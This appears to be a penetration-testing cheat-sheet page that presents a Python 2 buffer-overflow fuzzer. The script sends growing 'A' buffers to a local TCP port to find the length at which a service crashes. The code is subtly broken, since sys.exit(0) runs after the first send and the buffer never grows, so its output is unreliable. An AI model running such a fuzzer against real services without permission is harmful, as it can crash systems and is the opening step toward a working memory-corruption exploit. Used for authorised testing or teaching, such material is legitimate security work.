---
description: Loop increasing request size to trigger buffer overflow.
---

# Buffer Overflow Python Fuzzer

```text
#!/usr/bin/python 

import socket,sys
from time import sleep
address = '127.0.0.1'
port = 40449 
buffer = 'STRING' + "A" * 100
while True:
    try:
        print '[+] Sending buffer'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((address,port))
        #       s.recv(1024)
        s.send((buffer))
        s.close()
        sleep(1)
        sys.exit(0)
        buffer = buffer + "A"*50
    except:
        print "[!] Unable to connect to the application. Crashed at %s bytes" % str(len(buffer))
        sys.exit(0)


```

